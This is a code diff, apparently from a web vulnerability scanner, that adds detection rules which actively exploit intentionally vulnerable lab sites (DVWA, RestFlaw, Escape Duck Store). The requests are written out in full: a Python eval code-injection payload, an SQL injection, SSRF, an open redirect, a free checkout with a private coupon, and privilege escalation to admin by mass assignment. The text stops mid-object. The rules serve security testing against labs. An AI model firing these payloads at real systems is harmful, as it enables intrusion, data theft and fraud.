+  const weakUrl = new URL("/vulnerabilities/weak_id/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const hubDoc = await ctx.probe.get(weakUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (hubDoc.status < 200 || hubDoc.status >= 400) return NEGATIVE;
+  if (!/Weak Session IDs/i.test(hubDoc.body) || !/dvwaSession/i.test(hubDoc.body)) return NEGATIVE;
+  const doc1 = await ctx.probe.get(weakUrl, {
+    method: "POST",
+    body: "",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const sess1 = extractDvwaSessionValue(doc1.setCookies);
+  if (sess1 === null) return NEGATIVE;
+  const cookieJar = cookieHeaderFromSetCookies(doc1.setCookies);
+  const doc2 = await ctx.probe.get(weakUrl, {
+    method: "POST",
+    body: "",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: cookieJar
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  const sess2 = extractDvwaSessionValue(doc2.setCookies);
+  if (sess2 === null || sess2 <= sess1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      weakUrl,
+      firstSession: sess1,
+      secondSession: sess2,
+      note: "Pentest-Ground DVWA POST /vulnerabilities/weak_id/ issues sequential dvwaSession cookies (1, 2, …) — weak session ID route oracle; accepts /weak_session_ids discovery alias"
+    }
+  };
+};
+
+const pentestGroundDvwaJavascriptRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/javascript\/?/i.test(pageUrl)) return NEGATIVE;
+  const jsUrl = new URL("/vulnerabilities/javascript/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(jsUrl, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasSuccessPrompt = /Submit the word ["']success["'] to win/i.test(doc.body);
+  const hasPhraseForm =
+    /<form[^>]*name=["']low_js["']/i.test(doc.body) &&
+    /name=["']phrase["']/i.test(doc.body) &&
+    /name=["']token["']/i.test(doc.body);
+  const hasClientMd5 =
+    /md5\s*\(\s*rot13\s*\(\s*phrase\s*\)\s*\)/i.test(doc.body) ||
+    (/function\s+generate_token/i.test(doc.body) && /blueimp\/JavaScript-MD5/i.test(doc.body));
+  if (!hasSuccessPrompt || !hasPhraseForm || !hasClientMd5) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      jsUrl,
+      markers: ["phrase input", "md5(rot13(phrase)) token", "client-side validation"],
+      snippet: doc.body.match(/Submit the word ["']success["'] to win[\s\S]{0,80}/i)?.[0]?.slice(0, 100),
+      note: "Pentest-Ground DVWA /vulnerabilities/javascript/ validates phrase via client-side md5(rot13(phrase)) token — JavaScript attacks route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaOpenRedirectRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/open_redirect\/?/i.test(pageUrl)) return NEGATIVE;
+  const evilHost = "evil-open-redirect-probe.example";
+  const redirectUrl = new URL(
+    "/vulnerabilities/open_redirect/source/low.php",
+    pentestGroundDvwaProbeOrigin(ctx)
+  );
+  redirectUrl.searchParams.set("redirect", `https://${evilHost}`);
+  const doc = await ctx.probe.get(redirectUrl.toString(), {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    redirect: "manual"
+  });
+  const location = doc.headers["location"] || doc.headers.location || "";
+  if (![301, 302, 303, 307, 308].includes(doc.status)) return NEGATIVE;
+  if (!new RegExp(evilHost.replace(/\./g, "\\."), "i").test(location)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      redirectUrl: redirectUrl.toString(),
+      status: doc.status,
+      location: location.slice(0, 120),
+      note: "Pentest-Ground DVWA GET /vulnerabilities/open_redirect/source/low.php?redirect= returns HTTP 302 Location to attacker URL — open redirect route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaXssDRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/xss_d\/?/i.test(pageUrl)) return NEGATIVE;
+  const xssUrl = new URL("/vulnerabilities/xss_d/", pentestGroundDvwaProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(xssUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const hasDefaultParam = /document\.location\.href\.indexOf\(["']default=["']\)/i.test(doc.body);
+  const hasUnsafeWrite =
+    /document\.write\(["']<option value=['"]'\s*\+\s*lang/i.test(doc.body) ||
+    /document\.write\("<option value='" \+ lang/i.test(doc.body);
+  if (!hasDefaultParam || !hasUnsafeWrite) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      xssUrl,
+      markers: ["default= URL param", "document.write(lang)"],
+      snippet: doc.body.match(/document\.location\.href\.indexOf[\s\S]{0,120}/i)?.[0]?.slice(0, 100),
+      note: "Pentest-Ground DVWA /vulnerabilities/xss_d/ reads default= from document.location.href into document.write without encoding — DOM-based XSS route oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawEvalCodeInjectionRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const evalUrl = new URL("/eval", pentestGroundRestflawProbeOrigin(ctx));
+  evalUrl.searchParams.set("s", "__import__('os').popen('id').read()");
+  const doc = await ctx.probe.get(evalUrl.toString(), {
+    headers: { "X-Auth-Token": "THISISATOKEN" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/uid=\d+\([^)]+\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      evalUrl: evalUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw GET /eval?s= with X-Auth-Token: THISISATOKEN evaluates Python and returns uid= — code injection route oracle"
+    }
+  };
+};
+
 // --- Judgement Day AI red team arena (judgement-day-khaki.vercel.app) -----------------
 const CLIENT_JUDGEMENT_DAY_ARENA_RES: { label: string; re: RegExp }[] = [
   {
@@ -29930,6 +33413,1395 @@ const clientSideCybersecLabEvidence: Rule = async (ctx) => {
   };
 };
 
+// --- Escape Duck Store BOLA lab (duck-store.escape.tech) ----------------------------
+function isDuckStoreHost(ctx: RuleContext): boolean {
+  return /duck-store\.escape\.tech/i.test(ctx.origin);
+}
+
+const duckStoreUsersBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const listUrl = new URL("/api/v1/users/", ctx.origin).toString();
+  const listDoc = await ctx.probe.get(listUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (listDoc.status < 200 || listDoc.status >= 400) return NEGATIVE;
+  let rows: Array<{ id?: string; username?: string }>;
+  try {
+    rows = JSON.parse(listDoc.body) as Array<{ id?: string; username?: string }>;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(rows) || rows.length < 2) return NEGATIVE;
+  const adminRow = rows.find((r) => /admin/i.test(String(r.username || "")));
+  if (!adminRow?.id) return NEGATIVE;
+  const detailUrl = new URL(`/api/v1/users/${adminRow.id}`, ctx.origin).toString();
+  const detailDoc = await ctx.probe.get(detailUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (detailDoc.status < 200 || detailDoc.status >= 400) return NEGATIVE;
+  if (!/"email"\s*:\s*"admin@duck-store\.escape"/i.test(detailDoc.body)) return NEGATIVE;
+  if (!/"role"\s*:\s*"admin"/i.test(detailDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      listUrl,
+      detailUrl,
+      adminUsername: adminRow.username,
+      snippet: detailDoc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/users/ lists accounts and GET /api/v1/users/{uuid} returns admin email+role without auth — BOLA oracle"
+    }
+  };
+};
+
+const duckStoreUsersRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/users/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreUsersBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/users route scan — unauthenticated user list and admin profile disclosure (BOLA)"
+    }
+  };
+};
+
+const duckStoreTestimonialsBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/v1/testimonials", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let rows: Array<{ user?: { username?: string }; name?: string; role?: string; content?: string }>;
+  try {
+    rows = JSON.parse(doc.body) as typeof rows;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(rows) || rows.length < 2) return NEGATIVE;
+  const featured = rows.find((r) => /CISO|DevOps|patricia/i.test(`${r.role || ""} ${r.name || ""}`));
+  if (!featured?.user?.username && !featured?.name) return NEGATIVE;
+  if (!/"user_id"\s*:/.test(doc.body) || !/"content"\s*:/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: featured.user?.username ? 0.92 : 0.9,
+    evidence: {
+      url,
+      rowCount: rows.length,
+      sampleUser: featured.user?.username || featured.name,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/testimonials returns user-linked testimonial records with names and roles without auth — BOLA/information disclosure oracle"
+    }
+  };
+};
+
+const duckStoreTestimonialsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/testimonials/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreTestimonialsBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/testimonials route scan — unauthenticated testimonial records with linked user metadata"
+    }
+  };
+};
+
+const duckStoreOrdersBolaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const orderIdMatch = pageUrl.match(/\/api\/v1\/orders\/(\d+)/i);
+  const orderPath = orderIdMatch ? `/api/v1/orders/${orderIdMatch[1]}` : "/api/v1/orders/1";
+  const orderUrl = new URL(orderPath, ctx.origin).toString();
+  const doc = await ctx.probe.get(orderUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let order: { id?: number; user_id?: string; items?: unknown[]; status?: string };
+  try {
+    order = JSON.parse(doc.body) as typeof order;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!order.id || !order.user_id || !Array.isArray(order.items) || order.items.length < 1) return NEGATIVE;
+  if (!/"total_price"\s*:/.test(doc.body) || !/"status"\s*:/.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: order.items.length >= 2 ? 0.93 : 0.91,
+    evidence: {
+      orderUrl,
+      orderId: order.id,
+      userId: order.user_id,
+      status: order.status,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/orders/{id} returns full order detail with user_id, line items, and pricing without authentication — BOLA oracle"
+    }
+  };
+};
+
+const duckStoreOrdersRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/orders(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreOrdersBolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/orders route scan — unauthenticated order detail disclosure (BOLA)"
+    }
+  };
+};
+
+const duckStoreCouponsDisclosureLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/v1/orders/coupons", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let rows: Array<{ code?: string; discount_percent?: number; is_public?: boolean; is_active?: boolean }>;
+  try {
+    rows = JSON.parse(doc.body) as typeof rows;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(rows) || rows.length < 2) return NEGATIVE;
+  const privateCoupons = rows.filter((r) => r.is_public === false && r.code);
+  if (privateCoupons.length < 1) return NEGATIVE;
+  const highValue = privateCoupons.find((r) => (r.discount_percent ?? 0) >= 50);
+  return {
+    fired: true,
+    confidence: highValue ? 0.93 : 0.91,
+    evidence: {
+      url,
+      couponCount: rows.length,
+      privateCodes: privateCoupons.slice(0, 4).map((r) => r.code),
+      samplePrivate: privateCoupons[0]?.code,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/orders/coupons lists non-public coupon codes (is_public:false) without authentication — business-logic disclosure oracle"
+    }
+  };
+};
+
+const duckStoreCouponsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/(?:orders\/)?coupons/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreCouponsDisclosureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store coupons route scan — private coupon codes exposed via unauthenticated /api/v1/orders/coupons"
+    }
+  };
+};
+
+const duckStoreSsrfFetchUrlLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const probeTarget = "https://httpbin.org/get";
+  const url = new URL(`/api/v1/uploads/fetch-url?url=${encodeURIComponent(probeTarget)}`, ctx.origin).toString();
+  const doc = await ctx.probe.get(url, { maxBytes: 8192, timeoutMs: 20000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let parsed: { url?: string; status_code?: number; preview?: string; content_type?: string };
+  try {
+    parsed = JSON.parse(doc.body) as typeof parsed;
+  } catch {
+    return NEGATIVE;
+  }
+  if (parsed.status_code !== 200 || !parsed.preview) return NEGATIVE;
+  if (!/httpbin\.org/i.test(`${parsed.url || ""}\n${parsed.preview}`)) return NEGATIVE;
+  if (!/"origin"\s*:/.test(parsed.preview) || !/"url"\s*:/.test(parsed.preview)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: /python-httpx/i.test(parsed.preview) ? 0.93 : 0.91,
+    evidence: {
+      url,
+      probeTarget,
+      statusCode: parsed.status_code,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/uploads/fetch-url fetches attacker-controlled URLs server-side and returns response preview — SSRF oracle"
+    }
+  };
+};
+
+const duckStoreSsrfFetchUrlRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/uploads\/(?:fetch-url|import-from-url)/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreSsrfFetchUrlLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store uploads route scan — unauthenticated /api/v1/uploads/fetch-url SSRF fetches external URLs and returns body preview"
+    }
+  };
+};
+
+const duckStoreMcpCouponsDisclosureLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const url = new URL("/mcp/tools/list_coupons", ctx.origin).toString();
+  const payload = JSON.stringify({
+    jsonrpc: "2.0",
+    id: 1,
+    method: "tools/call",
+    params: { name: "list_coupons", arguments: {} }
+  });
+  const doc = await ctx.probe.get(url, {
+    method: "POST",
+    body: payload,
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json, text/event-stream"
+    },
+    maxBytes: 16384,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const sseBody = doc.body.replace(/^event:\s*message\s*/m, "").replace(/^data:\s*/m, "");
+  const corpus = `${doc.body}\n${sseBody}`;
+  if (!/VIP50|EMPLOYEE75|INTERNAL100/i.test(corpus)) return NEGATIVE;
+  if (!/is_public\\?"\s*:\s*false|is_public"\s*:\s*false/i.test(corpus)) return NEGATIVE;
+  const privateMatch = corpus.match(/"code"\\?"\s*:\s*\\?"(VIP50|EMPLOYEE75|INTERNAL100)\\?"/i);
+  return {
+    fired: true,
+    confidence: privateMatch ? 0.93 : 0.91,
+    evidence: {
+      url,
+      privateCode: privateMatch?.[1],
+      snippet: corpus.slice(0, 200).trim(),
+      note: "Duck Store MCP POST /mcp/tools/list_coupons returns non-public coupon codes (VIP50, EMPLOYEE75, INTERNAL100) without authentication — MCP tool disclosure oracle"
+    }
+  };
+};
+
+const duckStoreMcpCouponsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/mcp\/tools\/list_coupons/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreMcpCouponsDisclosureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store MCP route scan — list_coupons tool exposes private promotion codes without auth"
+    }
+  };
+};
+
+async function duckStoreRegisterAndLoginToken(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_ds_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const email = `${username}@example.com`;
+  const registerUrl = new URL("/api/v1/auth/register", ctx.origin).toString();
+  const registerDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, email, password: "ThugirTest123!" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 400) return null;
+  const loginUrl = new URL("/api/v1/auth/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: "ThugirTest123!" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return null;
+  try {
+    const data = JSON.parse(loginDoc.body) as { access_token?: string };
+    return data.access_token ?? null;
+  } catch {
+    return null;
+  }
+}
+
+const duckStoreProductsFilterSqliLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const baselineUrl = new URL("/api/v1/products/filter/by-color?color=Yellow&sort=name", ctx.origin).toString();
+  const baselineDoc = await ctx.probe.get(baselineUrl, { maxBytes: 8192, timeoutMs: 15000 });
+  if (baselineDoc.status < 200 || baselineDoc.status >= 400) return NEGATIVE;
+  let baseline: unknown[];
+  try {
+    baseline = JSON.parse(baselineDoc.body) as unknown[];
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(baseline) || baseline.length < 1) return NEGATIVE;
+  const sqliUrl = new URL("/api/v1/products/filter/by-color", ctx.origin);
+  sqliUrl.searchParams.set("color", "Yellow");
+  sqliUrl.searchParams.set("sort", "name;SELECT 1");
+  const sqliDoc = await ctx.probe.get(sqliUrl.toString(), { maxBytes: 8192, timeoutMs: 15000 });
+  if (!/Query error|sqlalchemy|asyncpg|SELECT \* FROM products/i.test(sqliDoc.body)) return NEGATIVE;
+  if (!/ORDER BY name;SELECT 1/i.test(sqliDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      baselineUrl,
+      sqliUrl: sqliUrl.toString(),
+      snippet: sqliDoc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/products/filter/by-color passes sort into raw SQL ORDER BY — error-based SQLi oracle"
+    }
+  };
+};
+
+const duckStoreProductsFilterSqliRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/products\/filter\/by-color/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreProductsFilterSqliLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/products/filter/by-color route scan — sort parameter SQL injection with query error disclosure"
+    }
+  };
+};
+
+const duckStoreCartNegativeQuantityLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const addUrl = new URL("/api/v1/cart/add", ctx.origin).toString();
+  const addDoc = await ctx.probe.get(addUrl, {
+    method: "POST",
+    body: JSON.stringify({ product_id: 1, quantity: -1 }),
+    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (addDoc.status < 200 || addDoc.status >= 400) return NEGATIVE;
+  if (!/"quantity"\s*:\s*-1/.test(addDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      addUrl,
+      snippet: addDoc.body.slice(0, 200).trim(),
+      note: "Duck Store POST /api/v1/cart/add accepts negative quantity:-1 after registration — business-logic oracle"
+    }
+  };
+};
+
+const duckStoreCartNegativeQuantityRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/cart\/add/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreCartNegativeQuantityLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/cart/add route scan — negative quantity accepted without server-side validation"
+    }
+  };
+};
+
+const duckStoreAdminUsersBflaLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const adminUrl = new URL("/api/v1/admin/users", ctx.origin).toString();
+  const doc = await ctx.probe.get(adminUrl, {
+    maxBytes: 16384,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${token}` }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"email"\s*:\s*"admin@duck-store\.escape"/i.test(doc.body)) return NEGATIVE;
+  if (!/"role"\s*:\s*"admin"/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      adminUrl,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "Duck Store GET /api/v1/admin/users returns full user roster including admin@duck-store.escape for a regular user JWT — BFLA oracle"
+    }
+  };
+};
+
+const duckStoreAdminUsersBflaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/admin\/users/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreAdminUsersBflaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/admin/users route scan — unprivileged JWT can list all users including admin accounts"
+    }
+  };
+};
+
+const DUCK_STORE_PROBE_SHIPPING = {
+  first_name: "Thugir",
+  last_name: "Probe",
+  address: "123 Probe St",
+  city: "Probe City",
+  zip_code: "12345",
+  country: "US"
+};
+
+const duckStoreCheckoutPrivateCouponLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const authHeader = { Authorization: `Bearer ${token}` };
+  const addUrl = new URL("/api/v1/cart/add", ctx.origin).toString();
+  const addDoc = await ctx.probe.get(addUrl, {
+    method: "POST",
+    body: JSON.stringify({ product_id: 1, quantity: 1 }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (addDoc.status < 200 || addDoc.status >= 400) return NEGATIVE;
+  const checkoutUrl = new URL("/api/v1/orders/checkout", ctx.origin).toString();
+  const checkoutDoc = await ctx.probe.get(checkoutUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      shipping: DUCK_STORE_PROBE_SHIPPING,
+      coupon_code: "INTERNAL100"
+    }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 20000
+  });
+  if (checkoutDoc.status < 200 || checkoutDoc.status >= 300) return NEGATIVE;
+  let order: { id?: number; total_price?: number; status?: string };
+  try {
+    order = JSON.parse(checkoutDoc.body) as { id?: number; total_price?: number; status?: string };
+  } catch {
+    return NEGATIVE;
+  }
+  if (!order.id) return NEGATIVE;
+  // INTERNAL100 is is_public:false and 100% off — order total should be shipping-only, not product+shipping.
+  if (typeof order.total_price !== "number" || order.total_price > 10) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      checkoutUrl,
+      coupon_code: "INTERNAL100",
+      order_id: order.id,
+      total_price: order.total_price,
+      snippet: checkoutDoc.body.slice(0, 240).trim(),
+      note: "Duck Store POST /api/v1/orders/checkout accepts private INTERNAL100 coupon (is_public:false via MCP) and completes at shipping-only total_price — private coupon checkout oracle"
+    }
+  };
+};
+
+const duckStoreCheckoutPrivateCouponRouteLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/v1\/orders\/checkout/i.test(pageUrl)) return NEGATIVE;
+  const result = await duckStoreCheckoutPrivateCouponLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Duck Store /api/v1/orders/checkout route scan — checkout accepts private INTERNAL100 MCP coupon without staff authorization"
+    }
+  };
+};
+
+const duckStoreProfileMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isDuckStoreHost(ctx)) return NEGATIVE;
+  const token = await duckStoreRegisterAndLoginToken(ctx);
+  if (!token) return NEGATIVE;
+  const authHeader = { Authorization: `Bearer ${token}` };
+  const profileUrl = new URL("/api/v1/users/me/profile", ctx.origin).toString();
+  const beforeDoc = await ctx.probe.get(profileUrl, {
+    headers: authHeader,
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (beforeDoc.status < 200 || beforeDoc.status >= 400) return NEGATIVE;
+  if (!/"role"\s*:\s*"user"/i.test(beforeDoc.body)) return NEGATIVE;
+  const putDoc = await ctx.probe.get(profileUrl, {
+    method: "PUT",
+    body: JSON.stringify({ role: "admin" }),
+    headers: { ...authHeader, "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (putDoc.status < 200 || putDoc.status >= 400) return NEGATIVE;
+  if (!/"role"\s*:\s*"admin"/i.test(putDoc.body)) return NEGATIVE;
+  const adminUrl = new URL("/api/v1/admin/users", ctx.origin).toString();
+  const adminDoc = await ctx.probe.get(adminUrl, {
+    headers: authHeader,
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (adminDoc.status < 200 || adminDoc.status >= 400) return NEGATIVE;
+  if (!/admin@duck-store\.escape/i.test(adminDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.95,
+    evidence: {
+      profileUrl,
+      putSnippet: putDoc.body.slice(0, 200).trim(),
+      adminUrl,
